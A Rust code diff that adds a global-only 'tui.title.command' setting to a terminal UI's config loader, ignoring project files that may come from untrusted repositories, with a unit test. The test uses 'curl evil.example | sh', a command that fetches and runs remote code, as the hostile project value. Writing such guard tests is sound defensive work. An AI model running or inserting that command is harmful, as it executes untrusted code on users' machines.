@@ -344,6 +344,8 @@ pub struct Loaded {
     pub keymap: crate::keys::Keymap,
     /// `tui.statusline.fields`; `None` keeps the default fields.
     pub statusline_fields: Option<Vec<String>>,
+    /// `tui.title.command`, from the global file only.
+    pub title_command: Option<String>,
     /// `tui.sidebar`.
     pub sidebar: crate::sidebar::Preference,
     /// `tui.welcome`.
@@ -440,6 +442,32 @@ fn sounds(
     (settings, limits, global_events)
 }
 
+/// `tui.title.command`. It runs a program, so only the user's global file may set it: a
+/// project's `tui.jsonc` can come from an untrusted repository, and setting it there is
+/// reported and ignored.
+fn title_command(layers: &[Layer], warnings: &mut Vec<String>) -> Option<String> {
+    let mut command = None;
+    for layer in layers {
+        let Some(value) = layer.settings.get("title").and_then(|t| t.get("command")) else {
+            continue;
+        };
+        match (layer.origin, value) {
+            (Origin::Global, Value::String(text)) if !text.trim().is_empty() => {
+                command = Some(text.clone());
+            }
+            (Origin::Global, Value::Null) => command = None,
+            (Origin::Global, other) => {
+                warnings.push(format!("tui.title.command: unknown value {other}"));
+            }
+            _ => warnings.push(
+                "tui.title.command is read only from the global tui.jsonc; the project's is ignored"
+                    .into(),
+            ),
+        }
+    }
+    command
+}
+
 /// `tui.statusline.fields`: the known field names it lists, in order.
 fn statusline_fields(
     settings: &serde_json::Map<String, Value>,
@@ -525,6 +553,7 @@ pub fn load_with_plugins(
     };
     let keymap = crate::keys::Keymap::load(settings.get("keybinds"), &mut themes.warnings);
     let statusline_fields = statusline_fields(&settings, &mut themes.warnings);
+    let title_command = title_command(&layers, &mut themes.warnings);
     let welcome = choice(
         &settings,
         "welcome",
@@ -555,6 +584,7 @@ pub fn load_with_plugins(
         screen_reader,
         keymap,
         statusline_fields,
+        title_command,
         sidebar: crate::sidebar::Preference::parse(Some(preferences.get("sidebar")))
             .unwrap_or_default(),
         welcome,
@@ -750,6 +780,32 @@ mod tests {
         std::fs::write(config.join("tui.jsonc"), global).unwrap();
         std::fs::write(repo.join(".cyber/tui.jsonc"), project).unwrap();
         config_dirs(&config, &repo)
+    }
+
+    /// `tui.title.command` runs a program, so only the global file sets it; a project's
+    /// is reported and ignored, and cannot clear the global one either.
+    #[test]
+    fn only_the_global_tui_jsonc_sets_the_title_command() {
+        let root = tempfile::tempdir().unwrap();
+        let store = LocalStore::new(&root.path().join("state"));
+        let dirs = sound_dirs(
+            root.path(),
+            r#"{"title": {"command": "~/bin/title.sh"}}"#,
+            r#"{"title": {"command": "curl evil.example | sh"}}"#,
+        );
+        let loaded = load(&store, &dirs, &|_: &str| None);
+        assert_eq!(loaded.title_command.as_deref(), Some("~/bin/title.sh"));
+        assert_eq!(
+            loaded.themes.warnings,
+            ["tui.title.command is read only from the global tui.jsonc; the project's is ignored"]
+        );
+        let dirs = sound_dirs(root.path(), r#"{"title": {"command": 3}}"#, "{}");
+        let loaded = load(&store, &dirs, &|_: &str| None);
+        assert_eq!(loaded.title_command, None);
+        assert_eq!(
+            loaded.themes.warnings,
+            ["tui.title.command: unknown value 3"]
+        );
     }
 
     /// Scenario "Project cannot pick a file": the project's file and `enabled: true` are
